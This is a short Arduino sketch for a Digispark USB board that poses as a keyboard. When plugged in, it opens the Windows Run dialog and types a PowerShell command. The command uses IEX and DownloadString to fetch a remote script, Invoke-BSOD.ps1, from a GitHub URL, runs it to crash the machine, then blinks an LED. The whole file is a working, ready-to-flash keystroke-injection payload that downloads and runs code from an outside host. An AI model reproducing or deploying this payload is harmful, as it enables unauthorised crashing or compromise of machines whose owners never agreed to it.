#include "DigiKeyboard.h"

void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/slash1div/slash1div/main/Junkyard/Invoke-BSOD.ps1'));Invoke-BSOD");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for (;;) {  // We are done, flash the LED forever
    digitalWrite(1, HIGH);
    delay(300);
    digitalWrite(1, LOW);
    delay(300);
  }
}
